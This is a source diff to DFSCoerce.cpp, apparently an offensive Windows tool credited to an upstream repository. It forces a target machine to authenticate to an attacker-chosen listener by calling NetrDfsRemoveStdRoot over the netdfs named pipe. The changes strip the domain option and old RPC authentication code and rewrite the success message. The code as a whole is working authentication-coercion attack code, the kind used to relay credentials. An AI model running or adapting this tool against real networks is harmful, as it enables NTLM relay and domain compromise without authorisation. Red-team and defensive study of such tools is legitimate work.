@@ -1,5 +1,8 @@
-// DFSCoerce.cpp : This file contains the 'main' function. Program execution begins and ends there.
-//
+// DFSCoerce.cpp : Original source form https://github.com/jfma7/DFSCoerce-exe
+// Add the ability to specify alternate credentials for explicit authentication. 
+// This can be particularly useful when running from a non-domain-joined machine with local user  or when there is a need to execute it as a different user.
+// @decoder_it
+// github 
 
 #include <iostream>
 #include "ms-dfsnm_h.h"
@@ -22,7 +25,7 @@ int wmain(int argc, wchar_t* argv[])
     wchar_t text_wchar[100], ipcshare[256];
 
 
-    wchar_t* domain = NULL;
+    
     wchar_t* user = NULL;
     wchar_t* password = NULL;
     wchar_t* target = NULL;
@@ -41,12 +44,7 @@ int wmain(int argc, wchar_t* argv[])
             user = argv[1];
             break;
 
-        case 'd':
-            ++argv;
-            --argc;
-            domain = argv[1];
-            break;
-
+        
         case 'p':
             ++argv;
             --argc;
@@ -78,7 +76,7 @@ int wmain(int argc, wchar_t* argv[])
 
 
     swprintf(text_wchar, 100, L"\\\\%s", target);
-    swprintf(ipcshare, 250, L"\\\\%s\\ipc$", target);
+    swprintf(ipcshare, 255, L"\\\\%s\\ipc$", target);
     
     status = RpcStringBindingCompose(
         NULL,                       // Interface's GUID, will be handled by NdrClientCall
@@ -103,31 +101,10 @@ int wmain(int argc, wchar_t* argv[])
         printf("[!] Error in RpcBindingFromStringBinding: %d\n", status);
         return -1;
     }
-    /*RPC_SECURITY_QOS SecurityQOS;
-    SecurityQOS.Version = RPC_C_SECURITY_QOS_VERSION;
-    SecurityQOS.Capabilities = RPC_C_QOS_CAPABILITIES_IGNORE_DELEGATE_FAILURE;// RPC_C_QOS_CAPABILITIES_DEFAULT; //RPC_C_QOS_CAPABILITIES_MUTUAL_AUTH;
+    
+    NETRESOURCE nr = { 0, RESOURCETYPE_DISK,0, 0, NULL, NULL, NULL, NULL };
 
-    SecurityQOS.IdentityTracking = RPC_C_QOS_IDENTITY_DYNAMIC;
-    SecurityQOS.ImpersonationType = RPC_C_IMP_LEVEL_IDENTIFY;*/
-    //RPC_SECURITY_QOS SecurityQOS = { RPC_C_SECURITY_QOS_VERSION, RPC_C_QOS_CAPABILITIES_MUTUAL_AUTH | (ImpersonationType == RPC_C_IMP_LEVEL_DELEGATE) ? RPC_C_QOS_CAPABILITIES_IGNORE_DELEGATE_FAILURE : 0, RPC_C_QOS_IDENTITY_STATIC, ImpersonationType };
-   /*  status = RpcBindingSetAuthInfoExA(
-         binding_handle,                 // Binding handle
-         (RPC_CSTR)"HOST/192.168.212.21",           // Server principal name
-         RPC_C_AUTHN_LEVEL_DEFAULT, // Authentication level
-         RPC_C_AUTHN_NONE,             // Authentication service
-         //RPC_C_AUTHN_NONE,
-         //(RPC_AUTH_IDENTITY_HANDLE)&auth, // Authentication identity
-         NULL,
-         RPC_C_AUTHN_DEFAULT,              // Authorization service
- //        &SecurityQOS                           // Authorization identity
- 0
-
-     );
-     /*status = RpcBindingSetAuthInfoA(binding_handle, host, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_AUTHZ_NONE, authp, 0);*/
-
-    NETRESOURCE nr = { 0, RESOURCETYPE_DISK,	0, 0, NULL, NULL, NULL, NULL };
-
-    nr.lpRemoteName = ipcshare;// (LPWSTR)L"\\\\192.168.212.17\\ipc$";
+    nr.lpRemoteName = ipcshare;
     
     if (user != NULL)
     {    DWORD dwRet = WNetCancelConnection2(nr.lpRemoteName, 0, TRUE);
@@ -142,10 +119,10 @@ int wmain(int argc, wchar_t* argv[])
     }
 
     
-    printf("[*] Attempting to coerce ncacn_np:%S[\\PIPE\\netdfs] and receive connection on: %S\n", target, listener);
+    printf("[*] Attempting to coerce auth on ncacn_np:%S[\\PIPE\\netdfs] and receive connection on: %S\n", target, listener);
 
     NET_API_STATUS nstatus=NetrDfsRemoveStdRoot(binding_handle, listener, (WCHAR*)"test", 1);
-    printf("[*] Result: %d - %d\n", nstatus, GetLastError());
+    printf("[+] DfsCoerce seems successful, check listener running on:%S\n",listener);
 
     return 1;
 }
